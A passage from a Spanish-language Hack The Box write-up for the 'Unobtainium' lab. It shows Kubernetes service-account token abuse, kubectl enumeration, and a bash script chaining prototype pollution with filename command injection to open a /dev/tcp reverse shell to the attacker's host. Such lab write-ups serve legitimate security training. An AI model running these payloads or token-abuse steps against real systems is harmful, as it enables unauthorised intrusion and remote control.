&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_revsh.png&quot; alt=&quot;338burp_unobtainium_upload_pollution_revsh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Revisamos nuestro listener yyyyyyyyyyyyyyyyyyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_nc_pollutionRevSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sip, es bastante fea jajaj, hacemos un tratamiento de TTY superr√°pido y tamos listos pa seguir (:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lanzt.gitbook.io/cheatsheet-pentest/tty&quot;&gt;https://lanzt.gitbook.io/cheatsheet-pentest/tty&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Estamos en un contenedor (: y en √©l tenemos acceso a la flag de usuario &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Con ayuda de &lt;strong&gt;Python&lt;/strong&gt; creamos un script que ya sea, nos ejecuta algunos comandos remotamente o nos entabla una Shell en el propio script, ah√≠ se los dejo (:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py&quot;&gt;pollutionRCE.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;lateral-webapp-devnode&quot;&gt;docker-webapp -&amp;gt; docker-devnode &lt;a href=&quot;#lateral-webapp-devnode&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Estando dentro encontramos poquitas cosas, enumerando las variables de entorno tenemos algunas referencias a &lt;strong&gt;Kubernetes&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ env
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_env.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La aplicaci√≥n en &lt;code&gt;10.96.137.170:3000&lt;/code&gt; fue la que explotamos. Nos llama la atenci√≥n &lt;code&gt;10.96.0.1:443&lt;/code&gt;, jugando con &lt;code&gt;cURL&lt;/code&gt; nos responde:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl -k https://10.96.0.1:443
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;kind&quot;: &quot;Status&quot;,
  &quot;apiVersion&quot;: &quot;v1&quot;,
  &quot;metadata&quot;: {
    
  },
  &quot;status&quot;: &quot;Failure&quot;,
  &quot;message&quot;: &quot;forbidden: User \&quot;system:anonymous\&quot; cannot get path \&quot;/\&quot;&quot;,
  &quot;reason&quot;: &quot;Forbidden&quot;,
  &quot;details&quot;: {
    
  },
  &quot;code&quot;: 403
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmmm‚Ä¶ Investigando sobre &lt;strong&gt;Kubernetes&lt;/strong&gt; encontramos cositas interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_necesidadkubernetes.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tomada de: &lt;a href=&quot;https://www.xataka.com/otros/docker-a-kubernetes-entendiendo-que-contenedores-que-mayores-revoluciones-industria-desarrollo&quot;&gt;docker-a-kubernetes&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y si, ah√≠ entra &lt;strong&gt;Kubernetes&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;En pocas palabras es un gestionador de contenedores (el ‚Äúmaestro de orquesta‚Äù), ayuda a reunir tooodos los contenedores y armar cl√∫steres (para que trabajen como si fueran uno), ya teni√©ndolos es muuuucho m√°s sencillo el administrarlos, implementarlos y escalarlos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://kubernetes.io/es/docs/concepts/overview/what-is-kubernetes/&quot;&gt;kubernetes.io - What is &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://azure.microsoft.com/es-es/topic/what-is-kubernetes/&quot;&gt;azure.microsoft.com - What is &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.redhat.com/es/topics/containers/what-is-kubernetes&quot;&gt;redhat.com - What is &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Buscando como podemos comunicarnos con &lt;strong&gt;Kubernetes&lt;/strong&gt; llegamos a &lt;a href=&quot;https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#without-using-a-proxy&quot;&gt;este recurso&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_accessAPI_curl.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validando si tenemos los archivos necesarios vemos que si:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/var/run/secrets/kubernetes.io/serviceaccount$ ls
ca.crt  namespace  token
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;expl-webapp-api-kubectl&quot;&gt;Jugando con la &lt;u&gt;API&lt;/u&gt; y con &lt;u&gt;kubectl&lt;/u&gt; &lt;a href=&quot;#expl-webapp-api-kubectl&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;As√≠ que generemos esas variables e intentemos de nuevo usar &lt;code&gt;cURL&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:~$ APISERVER=https://10.96.0.1:443
root@webapp-deployment-5d764566f4-mbprj:~$ SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
root@webapp-deployment-5d764566f4-mbprj:~$ TOKEN=$(cat ${SERVICEACCOUNT}/token)
root@webapp-deployment-5d764566f4-mbprj:~$ CACERT=${SERVICEACCOUNT}/ca.crt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Intentamos la petici√≥n hacia la &lt;strong&gt;API&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/$ curl --cacert ${CACERT} --header &quot;Authorization: Bearer ${TOKEN}&quot; -X GET ${APISERVER}/api
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;kind&quot;: &quot;APIVersions&quot;,
  &quot;versions&quot;: [
    &quot;v1&quot;
  ],
  &quot;serverAddressByClientCIDRs&quot;: [
    {
      &quot;clientCIDR&quot;: &quot;0.0.0.0/0&quot;,
      &quot;serverAddress&quot;: &quot;10.10.10.235:8443&quot;
    }
  ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, peeeeeeeeeeeeerfecto.&lt;/p&gt;

&lt;p&gt;Vemos que externamente la API esta en el puerto &lt;strong&gt;8443&lt;/strong&gt;, por lo que podemos asignar las mismas variables (movi√©ndonos el archivo &lt;code&gt;token&lt;/code&gt; y &lt;code&gt;cacert&lt;/code&gt;) en nuestra m√°quina y deber√≠a funcionar (:&lt;/p&gt;

&lt;p&gt;Ya que nos podemos comunicar con la &lt;strong&gt;API&lt;/strong&gt; empezar√≠amos a buscar cositas y ver como aprovecharnos de ellas‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#architecture&quot;&gt;Conceptos y arquitectura de &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;En &lt;a href=&quot;https://www.elladodelmal.com/2019/01/hacking-kubernetes-auditoria-de.html&quot;&gt;este post&lt;/a&gt; usan una herramienta llamada &lt;a href=&quot;https://github.com/aquasecurity/kube-hunter&quot;&gt;Kube-Hunter&lt;/a&gt; que se encarga de encontrar posibles vulnerabilidades en &lt;strong&gt;Kubernetes&lt;/strong&gt;, descarg√°ndola, movi√©ndola a la m√°quina y ejecutando solo nos muestra una vulnerabilidad:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kube-hunt --cidr 10.96.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_kubeHunter.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Donde √∫nicamente nos reporta una versi√≥n, pero dando vueltas con ella no logramos nada :‚Äô(&lt;/p&gt;

&lt;p&gt;En nuestra b√∫squeda llegamos ahora a &lt;a href=&quot;https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1&quot;&gt;este post&lt;/a&gt;, ac√° juega con la &lt;strong&gt;API&lt;/strong&gt; mediante &lt;code&gt;cURL&lt;/code&gt; y una herramienta llamada &lt;code&gt;kubectl&lt;/code&gt;, que curiosamente el sistema tiene una tarea programa para en caso de encontrarlo, borrarlo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ crontab -l
* * * * * find / -name kubectl -exec rm {} \;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As√≠ que puede ser importante, pero veamos primero lo de &lt;code&gt;cURL&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;‚ö° (&lt;strong&gt;&lt;em&gt;&lt;u&gt;Voy a simplificar el output, as√≠ que nos quedaremos con que estamos en&lt;/u&gt; &lt;code&gt;&amp;lt;devnode&amp;gt;&lt;/code&gt;&lt;/em&gt;&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ curl --cacert ${CACERT} --header &quot;Authorization: Bearer ${TOKEN}&quot; -X GET ${APISERVER}/api/v1/namespaces/kube-system/secrets
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero nos devuelve que no tenemos acceso a ese recurso como nuestro usuario ): peeeeero, ¬øy si quitamos &lt;code&gt;secrets&lt;/code&gt;?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ curl --cacert ${CACERT} --header &quot;Authorization: Bearer ${TOKEN}&quot; -X GET ${APISERVER}/api/v1/namespaces/kube-system
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_API_names_kubeSystem.png&quot; alt=&quot;338bash_pollutionSH_API_names_kubeSystem&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lindo, empezamos a encontrar rutas que nos devuelven algo distinto a &lt;strong&gt;Forbidden&lt;/strong&gt;, as√≠ que tamos bieeeeen‚Ä¶&lt;/p&gt;

&lt;p&gt;Estamos sobre un cluster llamado &lt;code&gt;kube-system&lt;/code&gt;, si vamos hacia atras intentando listar los ‚Äú&lt;a href=&quot;https://kubernetes.io/es/docs/concepts/overview/working-with-objects/namespaces/&quot;&gt;espacios de nombres&lt;/a&gt;‚Äù (clusters virtuales) encontramos uno llamativo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ curl --cacert ${CACERT} --header &quot;Authorization: Bearer ${TOKEN}&quot; -X GET ${APISERVER}/api/v1/namespaces
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;kind&quot;: &quot;NamespaceList&quot;,
  &quot;apiVersion&quot;: &quot;v1&quot;,
  &quot;metadata&quot;: {
    &quot;resourceVersion&quot;: &quot;65796&quot;
  },
  &quot;items&quot;: [
    {
      &quot;metadata&quot;: {
        &quot;name&quot;: &quot;default&quot;,
    ...
      &quot;metadata&quot;: {
        &quot;name&quot;: &quot;dev&quot;,
    ...
      &quot;metadata&quot;: {
        &quot;name&quot;: &quot;kube-node-lease&quot;,
    ...
      &quot;metadata&quot;: {
          &quot;name&quot;: &quot;kube-public&quot;,
    ...
      &quot;metadata&quot;: {
          &quot;name&quot;: &quot;kube-system&quot;,
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;¬øCu√°l? Pos si, &lt;code&gt;dev&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ curl --cacert ${CACERT} --header &quot;Authorization: Bearer ${TOKEN}&quot; -X GET ${APISERVER}/api/v1/namespaces/dev
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero no vemos nada relevante, simplemente que ese &lt;code&gt;namespace&lt;/code&gt; me son√≥ extra√±o y podemos tenerlo en cuenta por si algo‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Jugando con &lt;a href=&quot;https://kubernetes.io/es/docs/tasks/tools/install-kubectl/&quot;&gt;kubelet&lt;/a&gt; nos es m√°s sencillo movernos, as√≠ que siguiendo &lt;a href=&quot;https://kubernetes.io/es/docs/tasks/tools/install-kubectl/&quot;&gt;esta gu√≠a&lt;/a&gt; logramos descargarlo, lo subimos a la m√°quina (recuerden cambiarle el nombre, si no, el sistema lo borra) y empezamos a probar cositas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://10.10.14.146:8000/kubectl -o kubito
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://kubernetes.io/docs/reference/kubectl/cheatsheet/&quot;&gt;Siguiendo este &lt;strong&gt;Cheat Sheet&lt;/strong&gt;&lt;/a&gt; de &lt;strong&gt;kubectl&lt;/strong&gt; encontramos el uso de varios comandos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos viendo de manera m√°s sencilla lo que hab√≠amos encontrado con &lt;code&gt;cURL&lt;/code&gt;, por ejemplo para ver los ‚Äúespacios de nombre‚Äù simplemente ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get namespaces
NAME              STATUS   AGE
default           Active   167d
dev               Active   167d
kube-node-lease   Active   167d
kube-public       Active   167d
kube-system       Active   167d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos a &lt;code&gt;dev&lt;/code&gt;, que (despues de algunas pruebas) es el unico en el que tenemos ‚Äúpermisos‚Äù para leer cositas distintas a los dem√°s:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Validamos lo que podemos hacer contra cada &lt;code&gt;namespace&lt;/code&gt;‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(Cambiamos &lt;code&gt;-n&lt;/code&gt; por cada uno: &lt;strong&gt;default&lt;/strong&gt;, &lt;strong&gt;kube-node-lease&lt;/strong&gt;, &lt;strong&gt;kube-public&lt;/strong&gt; y &lt;strong&gt;kube-system&lt;/strong&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n default        
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;En los 4 podemos ver los &lt;code&gt;namespaces&lt;/code&gt; (tenemos el mismo output)&lt;/strong&gt;, pero con &lt;code&gt;dev&lt;/code&gt; podemos listar los &lt;strong&gt;pods&lt;/strong&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Pod&lt;/strong&gt; es un grupo de uno (aunque sea uno se le llama grupo) o m√°s contenedores dentro de un &lt;code&gt;namespace&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n dev    
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pues echemos un ojo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get pods -n dev    
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         167d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         167d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         167d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, encontramos 3 &lt;strong&gt;pods&lt;/strong&gt;, podemos ver una descripci√≥n de cada uno usando &lt;code&gt;describe&lt;/code&gt;, por ejemplo veamos la de &lt;code&gt;devnode-deployment-cd86fb5c-6ms8d&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Es gigante el output :P&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  &amp;lt;none&amp;gt;
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:              
  devnode:               
    Container ID:   docker://d12ba992b0492f26740ce2664c04a232b9324d5f6c745098b1375682fd16b6c3
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 02 Jul 2021 05:41:11 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    &amp;lt;none&amp;gt;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  &amp;lt;none&amp;gt;
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          &amp;lt;none&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(Lo √∫nico que cambia entre los 3 es la direcci√≥n &lt;strong&gt;IP&lt;/strong&gt; en la que est√°n sirviendo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;* devnode-deployment-cd86fb5c-6ms8d : 172.17.0.4
* devnode-deployment-cd86fb5c-mvrfz : 172.17.0.5
* devnode-deployment-cd86fb5c-qlxww : 172.17.0.7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(S√≠, s√© lo que puedes estar pensando, tranqui, ya ver√°s)&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;expl-webapp-bash-pollution&quot;&gt;Explotando y molestando al contenedor: &lt;u&gt;Prototype Pollution + Command Injection&lt;/u&gt; &lt;a href=&quot;#expl-webapp-bash-pollution&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Leyendo las descripciones con detenimiento (porque es con lo √∫nico con lo que podemos jugar) vemos que los contenedores est√°n sirviendo en el puerto &lt;strong&gt;3000&lt;/strong&gt; un servidor de node, que despu√©s de validar su respuesta record√© nuestra explotaci√≥n inicial hacia el servidor &lt;strong&gt;node&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.4:3000; echo
[]
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
[]
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.6:3000; echo
curl: (7) Failed to connect to 172.17.0.6 port 3000: Connection refused
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.7:3000; echo
[]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La respuesta es nada, pero podemos intentar jugar con alg√∫n servidor de los 3 que hay para ver si estamos ante el mismo servicio que explotamos anteriormente (node), para esto mandemos un mensaje (como los que ya hicimos), solo que ac√° debemos usar &lt;code&gt;cURL&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Juguemos con &lt;code&gt;http://172.17.0.5:3000&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ curl -s -H 'Content-Type: application/json' -X PUT -d '{&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;message&quot;:{&quot;text&quot;:&quot;holaaaaa&quot;}}' http://172.17.0.5:3000
{&quot;ok&quot;:true}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al parecer nos dej√≥, por lo que vamos tirando a que efectivamente es el mismo servicio, comprobemos que se subi√≥ el mensaje:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
[{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;holaaaaa&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625437769543,&quot;userName&quot;:&quot;felamos&quot;}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, pues estamos ejecutando el mismo servicio de antes (:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Perdi mucho tiempo al no centrarme en esto, es claro el &lt;em&gt;path&lt;/em&gt; pero en su momento no lo vi :P&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Segu√≠ enumerando y enumerando y nada, full perdido, as√≠ que me fui a buscar ayuda, esta fue la pista:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;‚ÄúPiensa en &lt;code&gt;webapp&lt;/code&gt; como &lt;code&gt;devnode&lt;/code&gt;‚Äú‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Dando vueltas con ella ca√≠ en cuenta de algo al mirar la terminal y al leer lo que hab√≠amos hecho hace un momento con &lt;code&gt;cURL&lt;/code&gt; y el servidor node:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;webapp-deployment&lt;/strong&gt; esta en nuestro hostname yyyyyyy si miramos la descripci√≥n de alg√∫n &lt;strong&gt;pod&lt;/strong&gt; vemos &lt;strong&gt;devnode-deployment&lt;/strong&gt; en su nombre, podemos pensar que estamos situados en alg√∫n contenedor del &lt;strong&gt;pod&lt;/strong&gt; que encierra a la aplicaci√≥n web (&lt;code&gt;webapp&lt;/code&gt;), por lo que si existen otros contenedores que (seg√∫n su nombre) hacen referencia a entornos de desarrollo (&lt;code&gt;devnode&lt;/code&gt;), probablemente debamos movernos a alguno de ellos :o APAAAA, entiendo tu PISTAAAaaAAAAa.&lt;/p&gt;

&lt;p&gt;Peeeeero ¬øy como nos movemoooooooos? :(&lt;/p&gt;

&lt;p&gt;Pues ac√° entra en juego lo que hab√≠amos probado con &lt;code&gt;cURL&lt;/code&gt; y los servidores node internos, ya que ellos est√°n sirviendo desde contenedores llamados &lt;code&gt;devnode-deployment...&lt;/code&gt; y nosotros estamos sobre contenedores llamados &lt;code&gt;webapp-deployment...&lt;/code&gt;. Por lo que simplemente deber√≠amos volver a ejecutar nuestra explotaci√≥n, pero contra alg√∫n servidor &lt;strong&gt;node&lt;/strong&gt; interno (:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_woooooow.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos crear un script en &lt;code&gt;bash&lt;/code&gt; que nos haga la gesti√≥n muuuucho m√°s r√°pido y sea est√©tico, as√≠ evitamos tener que estar limpiando la terminal por culpa de los comandos &lt;code&gt;cURL&lt;/code&gt; tan largos :P (adem√°s de practicar nuestro scripting en bash).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

# CTRL + C
function ctrl_c() {
    echo &quot;s4l1eNdo...&quot;
}
trap ctrl_c INT

# ---- Funciones del programa

todo_data() {
    cat &amp;lt;&amp;lt;EOF
    {
        &quot;auth&quot;: {
            &quot;name&quot;: &quot;felamos&quot;,
            &quot;password&quot;: &quot;Winter2021&quot;
        },
        &quot;filename&quot;: &quot;todo.txt&quot;
    }
EOF
}

upload_data() {
    cat &amp;lt;&amp;lt;EOF
    {
        &quot;auth&quot;: {
            &quot;name&quot;: &quot;felamos&quot;,
            &quot;password&quot;: &quot;Winter2021&quot;
        },
        &quot;filename&quot;: &quot;&amp;amp; bash -c 'bash &amp;gt;&amp;amp; /dev/tcp/$1/$2 0&amp;gt;&amp;amp;1'&quot;
    }
EOF
}

message_data() {
    cat &amp;lt;&amp;lt;EOF
    {
        &quot;auth&quot;: {
            &quot;name&quot;: &quot;felamos&quot;,
            &quot;password&quot;: &quot;Winter2021&quot;
        },
        &quot;message&quot;: {
            &quot;text&quot;: &quot;holadenuevorey&quot;,
            &quot;__proto__&quot;: {
               &quot;canUpload&quot;: &quot;true&quot;
            }
        }
    }
EOF
}

# ---- Variables globales

URL=&quot;$1&quot;
IP=&quot;$2&quot;
PORT=&quot;$3&quot;

# ---- Inicio del programa

if [ -z $URL ] || [ -z $IP ] || [ -z $PORT ]; then
    echo -e &quot;\n[!] Uso: $0 http://node_server lhost lport&quot;
    echo -e &quot;Ejemplo: $0 http://10.10.10.235:31337 10.10.14.146 4433\n&quot;
    exit 1
else
    # Asignamos objeto `canUpload`
    curl -s -H &quot;Content-Type: application/json&quot; -X PUT -d &quot;$(message_data)&quot; $URL &amp;gt; /dev/null

    # Subimos archivo con comando
    curl -s -H &quot;Content-Type: application/json&quot; -X POST -d &quot;$(upload_data $IP $PORT)&quot; $URL/upload &amp;gt; /dev/null
    echo -e &quot;\n[+] Reverse Shell Generada!!\n&quot;
fi
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/insidePollutionRCE.sh&quot;&gt;insidePollutionRCE.sh&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

